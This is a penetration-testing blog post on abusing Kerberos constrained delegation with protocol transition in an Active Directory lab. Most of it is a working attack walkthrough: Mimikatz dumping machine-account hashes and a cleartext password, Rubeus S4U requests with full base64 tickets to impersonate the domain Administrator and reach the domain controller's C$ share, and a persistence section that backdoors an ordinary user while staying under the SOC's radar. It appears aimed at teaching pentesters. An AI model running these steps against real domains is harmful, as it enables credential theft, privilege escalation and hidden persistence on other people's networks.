---
layout: post
title:  "Kerberos constrained delegation with protocol transition"
date:   2020-11-27
category: Pentesting
excerpt_separator: <!--more-->
has_translation: true
lang: en
---  
Hello,  

Today, we are talking about the exploitation of Kerberos protocol extensions [S4U2Self](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/02636893-7a1f-4357-af9a-b672e3e3de13) and [S4U2Proxy](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/bde93b0e-f3c9-4ddf-9f44-e1453be7af5a) in order to impersonate a privileged user of the domain.  

This post aims at focusing on the [Kerberos constrained delegation with protocol transition](https://docs.microsoft.com/fr-fr/previous-versions/windows/it-pro/windows-server-2003/cc739587(v=ws.10)) which we will shorten ```T2A4D``` (**TrustedToAuthForDelegation**); how to enumerate it, how to exploit it and use it as a method of persistence.   
<!--more-->
To not reinvent the wheel, you will find a very good article introducing the kerberos delegation on the blog [hackndo](https://beta.hackndo.com/constrained-unconstrained-delegation/).  

# Implementation of the constrained delegation with protocol transition + msDS-AllowedToDelegateTo  

## Prerequisites  

There are two methods to benefit from the Active Directory cmdlets:  
 1. ```Get-WindowsCapability -Name Rsat.ActiveDirectory* -Online | Add-WindowsCapability -Online```  
    *N.B: can also be done offline thanks to the downloadable [iso](https://my.visualstudio.com/Downloads/Featured)*
 2. [https://github.com/samratashok/ADModule](https://github.com/samratashok/ADModule)  

## TrustedToAuthForDelegation

```srv$``` is a machine account of the domain.  

```powershell
Get-ADComputer -Identity srv | Set-ADAccountControl -TrustedToAuthForDelegation $True
Set-ADComputer -Identity srv -Add @{'msDS-AllowedToDelegateTo'=@('TIME/DC.WINDOMAIN.LOCAL','TIME/DC')}
```

or through GUI:  
<img class="dropshadowclass" src="{{ site.url }}/public/images/t2a4d/setup_t2a4d.png" style="margin-top:1.5rem;margin-bottom:1.5rem;">

Note that the constrained delegation can also be based on the resource (property **msds-allowedtoactonbehalfofotheridentity**).  
Indeed, it seems more consistent to give legitimacy to a resource to decide which other resource can access it. We will come back to this later.  

Let's get our hands dirty.  

# Enumeration

The first interesting thing is to be able to list the service accounts affected by T2A4D :  
```powershell
PS C:\tools> Get-ADObject -LDAPFilter "(useraccountcontrol:1.2.840.113556.1.4.803:=16777216)" -Properties distinguishedName,samAccountName,samAccountType,userAccountControl,msDS-AllowedToDelegateTo,servicePrincipalName | fl


useraccountcontrol       : WORKSTATION_TRUST_ACCOUNT, TRUSTED_TO_AUTH_FOR_DELEGATION
serviceprincipalname     : {WSMAN/SRV, WSMAN/SRV.windomain.local, TERMSRV/SRV, TERMSRV/SRV.windomain.local...}
msds-allowedtodelegateto : {TIME/DC, TIME/DC.WINDOMAIN.LOCAL}
distinguishedname        : CN=SRV,CN=Computers,DC=windomain,DC=local
samaccountname           : SRV$
samaccounttype           : MACHINE_ACCOUNT
```

The tool [Invoke-Recon](https://github.com/phackt/Invoke-Recon) will find it all for you.  

# Attack scenario

We are going to compromise a machine ```srv$``` with the attribute [useraccountcontrol](https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/useraccountcontrol-manipulate-account-properties) with the value **trusted_to_auth_for_delegation**.  

![t2a4d]({{ site.url }}/public/images/t2a4d/recon_t2a4d.png)

The machine ```srv$``` runs a service ```SA``` on which a user *whatever* authenticates using another mechanism than Kerberos (e.g. a web application with NTLM or basic authentication). In this case, ```SA``` (or the web application) did not get any service ticket proving authentication from *whatever* to ```SA```. This service ticket is normally used by the ``S4U2Proxy`` mechanism in order to carry out the classical constrained delegation.  

This is where the **constrained delegation with protocol transition** comes in. The latter will still allow the "double jump" and allow ```SA``` to request a service ticket for ```SB``` by taking the identity of the user *whatever*.  

```SB``` is either in the **msDS-AllowedToDelegateTo** field of ```SA```:  
<img class="dropshadowclass" src="{{ site.url }}/public/images/t2a4d/msds_a2d2.png" style="margin-top:1.5rem;margin-bottom:1.5rem;">

Or ```SA``` is in the **msDS-AllowedToActOnBehalfOfOtherIdentity** field of ```SB``` (Resource-Based Constrained Delegation).  
<img class="dropshadowclass" src="{{ site.url }}/public/images/t2a4d/msds_actonbehalf.png" style="margin-top:1.5rem;margin-bottom:1.5rem;">    

This delegation will involve the protocol extensions **ServiceForUserToSelf** and **ServiceForUserToProxy** :  
 1. **S4U2Self** will simulate the kerberos authentication and thus the service ticket request for the user *whatever*.  
   ```SA``` will somehow request a service ticket for itself for an arbitrary user.  
   The result is a *forwardable* ```T_SA``` service ticket that can then be passed to the **S4U2Proxy** mechanism, the latter used for classical constrained delegation. Please note that the *forwardable* flag is necessary and will be set if the delegating account is marked as [TRUSTED_TO_AUTH_FOR_DELEGATION](https://docs.microsoft.com/fr-fr/troubleshoot/windows-server/identity/useraccountcontrol-manipulate-account-properties).  

 2. **S4U2Proxy** will use ```T_SA``` as a proof of *whatever* authentication to ```SA``` in order to obtain a *forwarded* service ticket for ```SB```.

 3. The arbitrary user *whatever* connects to the service ```SB```.

If the ```T2A4D``` service account running ```SA``` has been compromised, we can generate a ```T_SA``` for an arbitrary account (Domain Administrator) for an authorized service (**msDS-AllowedToDelegateTo** or **msds-AllowedToActOnBehalfOfOtherIdentity** if resource-based).  

The [SPNs](https://beta.hackndo.com/service-principal-name-spn/) being interchangeable (unencrypted part of the service ticket), it is possible to modify it by another SPN of the same service account (ex: using the service class *CIFS*, which gives us the SPN *CIFS/DC* instead of *TIME/DC*).  

<pre>
We have to be able to delegate the impersonated account.
</pre>
It must be neither [Protected Users](https://docs.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/protected-users-security-group), nor "**Account is sensitive and cannot be delegated**".  

# <a name="Exploitation"></a>Exploitation  

It will be necessary to first compile Rubeus (from the repo [Rubeus](https://github.com/GhostPack/Rubeus), launch the project, "Build -> Build Solution").  

It is assumed here that the ```srv$``` machine has been compromised beforehand. Let's find out its credentials:  
```cmd
C:\tools> C:\tools\Mimikatz\x64\mimikatz.exe "privilege::debug" "sekurlsa::logonPasswords" "exit"

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 18 2020 19:18:29
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # sekurlsa::logonPasswords

Authentication Id : 0 ; 19484783 (00000000:0129506f)
Session           : Interactive from 2
User Name         : DWM-2
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 9/25/2020 10:06:29 AM
SID               : S-1-5-90-0-2
        msv :
         [00000003] Primary
         * Username : srv$
         * Domain   : WINDOMAIN
         * NTLM     : b5858035cb595dd82050f9193b220232
         * SHA1     : b7607fdc98a40ae1cfb47478b8d929139d18f6cb
        tspkg :
        wdigest :
         * Username : SRV$
         * Domain   : WINDOMAIN
         * Password : (null)
        kerberos :
         * Username : SRV$
         * Domain   : windomain.local
         * Password : HXEq%dCV$Qp0`b-:LE,zT]x%Sl&G_n8C1eP(aIymKGM-d^E;J5>$uj*0? &duWc:"$tL$KtkJuqE+t[s@fw$#YA:O$Bh<%usYq@vU5 ,i6q^JK=q9bV:Ue?Y
        ssp :
        credman :
...
```

Now we need to unroll the S4U to generate a service ticket, not for *TIME/DC*, but for *CIFS/DC* for the **WINDOMAIN\Administrator** user.  

Let's check that the share ```\\DC\C$``` is refused to us:  
```
C:\tools>dir \\DC\C$
Access is denied.
```

First, we request a TGT for the compromised service account ```srv$```:  
```cmd
C:\tools> C:\tools\Rubeus\Rubeus-master\Rubeus\bin\Debug\rubeus.exe asktgt /user:srv$ /domain:windomain.local /ntlm:b5858035cb595dd82050f9193b220232 /outfile:srv.tgt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.5.0

[*] Action: Ask TGT

[*] Using rc4_hmac hash: b5858035cb595dd82050f9193b220232
[*] Building AS-REQ (w/ preauth) for: 'windomain.local\srv$'
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIE5DCCBOCgAwIBBaEDAgEWooID9DCCA/BhggPsMIID6KADAgEFoREbD1dJTkRPTUFJTi5MT0NBTKIk
      MCKgAwIBAqEbMBkbBmtyYnRndBsPd2luZG9tYWluLmxvY2Fso4IDpjCCA6KgAwIBEqEDAgECooIDlASC
      A5DCmCD2rczQzoD7RBj3++6B+e7j68hijB0EoPUE87/OBc6Rw5hAPLzcWFJC8sfBuWWywOB/Y4O6Z9Xv
      IKQsk8mypOz33ffprU2NhtGGz9fcuy2oFKonUhUU3QSCgMT16KOfkpt2QYsan9zV4vUJpdEDrRCkdKCx
      +bu+dL63100hpjT8BlOZDsobNBPalaQRo1AihpxPgA48UtsDVB/hG0A4monF5x2wCBsoKy+7MEBi0CAa
      tLDv60ly4eIvRPijEXkN3Zmm/l1wIzWt4WpcGFdpoSTS+VLkgws9zHVCuoQlOGWURjTHRksHjIG6Exkf
      KXyCBCuO6vUxC+DUv3vCVC1wBEs5e7VXtGPhUzd8jJoSVCc+oSv4zXS+NzVf0RTr8ephMHxrXzzpCVQL
      y+3fLU+5/xcnzZiTypBDnjeluHKnlj+cZhQVniQU5PEhGw+DnaL22QZqOPY08VouXUtE44spKsrRGu8N
      qkwqdLVFTDSNNYgUGFGAvUG7QyWeC/XhbYvA5dpM9DUXhVo7ri3A4TZbLSfdrfiy14cOrl6AV8yD1Afo
      +Dks8KELhnba6JWdY6RVgbgXgvwDuy69JKrTPhifpTwEMrvbJejRnM0iD4YwwPTY6qT9xtXDRw5nfb/N
      yd2WZVmwlFsg3JBl0VCNAzfTxyZLhta5s8G8lRJmpBTUPgxWXVleta4v9XGGoWuT0WlmSveXSKrowwLZ
      BhHaSm0/IVRypnWyJYEY+PU7LXOsHDt3arS8WWMUV/niRYEVSIHM86AF5m7VJL52XRXeM45u/jtpWwfL
      b0/Dx0Hma2A/dti+2ns+PyjQxhMxj9iqKwyVAsNYkKlTL8HgD/NqT+Tt2Lh7CnhP6gqIpdQswTUq/XLO
      8FA/ZKtg13mF0A8FqbUKbmcntXc6+oBklkoQAilQSbShmrVuqLAMEoMOnc2l7S0tTGpDlPkNzIzcTk9l
      BdPbVvmWhMOu8JV/SywUW60pO3YpoBu8qpIuHUboFNbzBszDh+N0D9WK8Idt5YSQAqVpRQY01aDiO1H8
      rOq1yrDlShkzNG2pixurvyNsckdRRytESyggACpn12cXOWOOUcQzMyf42m+gyuj4WaoL98elvax0Qz51
      wSFpyoBq4gj1QF+h2RroJabfKBIwemCbeKD7CE5gQEkYLWCjoSNwzYGMEmtVZdDib8nlIRarsqNsrZGF
      RTpD9hg1sjrWJhZ9gjijgdswgdigAwIBAKKB0ASBzX2ByjCBx6CBxDCBwTCBvqAbMBmgAwIBF6ESBBD6
      04gmG9bj12WZbdd2ZJYboREbD1dJTkRPTUFJTi5MT0NBTKIRMA+gAwIBAaEIMAYbBHNydiSjBwMFAEDh
      AAClERgPMjAyMDA5MjUxODA1MDdaphEYDzIwMjAwOTI2MDQwNTA3WqcRGA8yMDIwMTAwMjE4MDUwN1qo
      ERsPV0lORE9NQUlOLkxPQ0FMqSQwIqADAgECoRswGRsGa3JidGd0Gw93aW5kb21haW4ubG9jYWw=

[*] Ticket written to srv.tgt


  ServiceName           :  krbtgt/windomain.local
  ServiceRealm          :  WINDOMAIN.LOCAL
  UserName              :  srv$
  UserRealm             :  WINDOMAIN.LOCAL
  StartTime             :  9/25/2020 6:05:07 PM
  EndTime               :  9/26/2020 4:05:07 AM
  RenewTill             :  10/2/2020 6:05:07 PM
  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType               :  rc4_hmac
  Base64(key)           :  +tOIJhvW49dlmW3XdmSWGw==
```

Then this TGT will allow us to initiate the **S4U2Self**. Then the **S4U2Proxy** will intervene as explained previously for the *CIFS* service (be aware of */altservice:cifs*) :
```cmd
C:\tools> C:\tools\Rubeus\Rubeus-master\Rubeus\bin\Debug\rubeus.exe s4u /ticket:srv.tgt /msdsspn:TIME/DC /impersonateuser:Administrator /domain:windomain.local /altservice:CIFS /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.5.0

[*] Action: S4U

[*] Action: S4U

[*] Using domain controller: dc.windomain.local (192.168.38.102)
[*] Building S4U2self request for: 'srv$@WINDOMAIN.LOCAL'
[*] Sending S4U2self request
[+] S4U2self success!
[*] Got a TGS for 'Administrator@WINDOMAIN.LOCAL' to 'srv$@WINDOMAIN.LOCAL'
[*] base64(ticket.kirbi):

      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
      QUlOLkxPQ0FMqREwD6ADAgEBoQgwBhsEc3J2JA==

[+] Ticket successfully imported!
[*] Impersonating user 'Administrator' to target SPN 'TIME/DC'
[*]   Final ticket will be for the alternate service 'cifs'
[*] Using domain controller: dc.windomain.local (192.168.38.102)
[*] Building S4U2proxy request for service: 'TIME/DC'
[*] Sending S4U2proxy request
[+] S4U2proxy success!
[*] Substituting alternative service name 'cifs'
[*] base64(ticket.kirbi) for SPN 'cifs/dc':

      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
      TE9DQUypFTAToAMCAQKhDDAKGwRjaWZzGwJkYw==
[+] Ticket successfully imported!

```

We do have our service ticket for **CIFS/DC** in the name of **WINDOMAIN\Administrator** :
```cmd
C:\tools> klist
...
#1>     Client: Administrator @ WINDOMAIN.LOCAL
        Server: cifs/dc @ WINDOMAIN.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_canonicalize
        Start Time: 9/25/2020 18:05:46 (local)
        End Time:   9/26/2020 4:05:07 (local)
        Renew Time: 10/2/2020 18:05:07 (local)
        Session Key Type: AES-128-CTS-HMAC-SHA1-96
        Cache Flags: 0
        Kdc Called:
...
```

Let's test it out:
```cmd
C:\tools>dir \\DC\C$
 Volume in drive \\DC\C$ is Windows 2019
 Volume Serial Number is 28C8-9A14

 Directory of \\DC\C$

09/27/2020  08:50 AM    <DIR>          PerfLogs
09/27/2020  08:06 AM    <DIR>          Program Files
09/27/2020  08:00 AM    <DIR>          Program Files (x86)
10/20/2020  01:07 PM    <DIR>          tmp
09/27/2020  08:00 AM    <DIR>          Users
10/20/2020  01:26 PM    <SYMLINKD>     vagrant [\\vboxsvr\vagrant]
10/20/2020  01:10 PM    <DIR>          Windows
               0 File(s)              0 bytes
               7 Dir(s)  36,839,563,264 bytes free
```

# <a name="Persistence"></a>Persistence  

To set the **TRUSTED_TO_AUTH_FOR_DELEGATION** attribute, we need the **SeEnableDelegationPrivilege**.  

*Fortunately Microsoft protect any user from setting this flag unless they are listed in the User Rights Assignment setting "Enable computer and user accounts to be trusted for delegation" (SeEnableDelegationPrivilege) on the Domain Controller. So by default only members of BUILTIN\Administrators (i.e. Domain Admins/Enterprise Admins) have the right to modify these delegation settings.*

An interesting persistence method consists, from a compromised user with the ```SeEnableDelegationPrivilege``` privilege, in setting the ```TRUSTED_TO_AUTH_FOR_DELEGATION``` value on another lambda compromised user that can be delegated, and to edit the ```mDS-AllowedToDelegateTo``` field with the SPN ```CIFS/DC``` for example, allowing to replay the attack.  

## T2A4D on an arbitrary domain user

You have compromised a privileged user, however the [protected groups](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-c--protected-accounts-and-groups-in-active-directory) are supervised by the SOC, they have their security descriptors reset by the ```SDProp``` mechanism ([AdminSDHolder](https://social.technet.microsoft.com/wiki/contents/articles/22331.adminsdholder-protected-groups-and-security-descriptor-propagator.aspx)), etc, so many elements that make you say that you would like to backdoor a user who can spend as much time as possible under the radars (let's hope however that a delegation to a DC is supervised by the SOC).  

Let's play this method in our lab. The ```bleponge``` user is the most banal domain user, ```admin01``` is what you have been sweating for the last few days:  

```powershell
PS C:\> WMIC OS Get Name
Name
Microsoft Windows 10 Education N|C:\Windows|\Device\Harddisk0\Partition2

PS C:\> whoami
windomain\admin01

PS C:\> net user admin01 /domain | Select-String "Group"

Local Group Memberships
Global Group memberships     *Domain Users         *Domain Admins

PS C:\> net user bleponge /domain | Select-String "Group"

Local Group Memberships
Global Group memberships     *Domain Users

PS C:\> Get-ADObject -Identity bleponge -Properties distinguishedName,samAccountName,samAccountType,userAccountControl,msDS-AllowedToDelegateTo,servicePrincipalName | fl

useraccountcontrol : NORMAL_ACCOUNT
distinguishedname  : CN=Bob ble. Leponge,CN=Users,DC=windomain,DC=local
samaccountname     : bleponge
samaccounttype     : USER_OBJECT

PS C:\> Get-ADUser -Identity bleponge | Set-ADAccountControl -TrustedToAuthForDelegation $True
PS C:\> Set-ADUSer -Identity bleponge -Add @{'msDS-AllowedToDelegateTo'=@('CIFS/DC.WINDOMAIN.LOCAL','CIFS/DC')}
PS C:\> Set-ADObject -Identity bleponge -SET @{serviceprincipalname='nonexistent/BLAHBLAH'}
PS C:\> Get-ADObject -Identity bleponge -Properties distinguishedName,samAccountName,samAccountType,userAccountControl,msDS-AllowedToDelegateTo,servicePrincipalName | fl

useraccountcontrol       : NORMAL_ACCOUNT, TRUSTED_TO_AUTH_FOR_DELEGATION
serviceprincipalname     : nonexistent/BLAHBLAH
msds-allowedtodelegateto : {CIFS/DC, CIFS/DC.WINDOMAIN.LOCAL}
distinguishedname        : CN=Bob ble. Leponge,CN=Users,DC=windomain,DC=local
samaccountname           : bleponge
samaccounttype           : USER_OBJECT
```

Take care with the command ```Set-ADObject -Identity bleponge -SET @{serviceprincipalname='nonexistent/BLAHBLAH'}```.  
Indeed, in order for the ```S4U2Self``` mechanism to work with Rubeus, a SPN must be set on the ```bleponge``` user, otherwise an exception will be propagated:  
```
...
[!] Unhandled Rubeus exception:

System.NullReferenceException: Object reference not set to an instance of an object.
   at Rubeus.S4U.S4U2Proxy(KRB_CRED kirbi, String targetUser, String targetSPN, String outfile, Boolean ptt, String domainController, String altService, KRB_CRED tgs, Boolean opsec)
   at Rubeus.S4U.Execute(KRB_CRED kirbi, String targetUser, String targetSPN, String outfile, Boolean ptt, String domainController, String altService, KRB_CRED tgs, String targetDomainController, String targetDomain, Boolean s, Boolean opsec, String requestDomain, String impersonateDomain)
   at Rubeus.Commands.S4u.Execute(Dictionary`2 arguments)
   at Rubeus.Domain.CommandCollection.ExecuteCommand(String commandName, Dictionary`2 arguments)
   at Rubeus.Program.MainExecute(String commandName, Dictionary`2 parsedArgs)
```

Now all you have to do is to go back to our [Exploitation](#Exploitation) section and to reproduce the attack in the context of our ```bleponge``` user.  

*Testing with the ```HOST``` service class (HOST/DC), it was impossible for us to list our share ```\\DC\C$```. This has already been encountered by [pixis](https://beta.hackndo.com/service-principal-name-spn/#cas-particulier---host).*  


## SeEnableDelegationPrivilege

We can also create a backdoor for a user by assigning him the ```SeEnableDelegationPrivilege```, so that this user can set the ```TRUSTED_TO_AUTH_FOR_DELEGATION``` on another resource. However, we will also need the necessary rights to write the ```msDS-AllowedToDelegateTo``` field.  

# The End

Feel free to comment / ask your questions. You can also contact me on [Twitter](https://twitter.com/phackt_ul).  

See you soon.  

Phackt.  
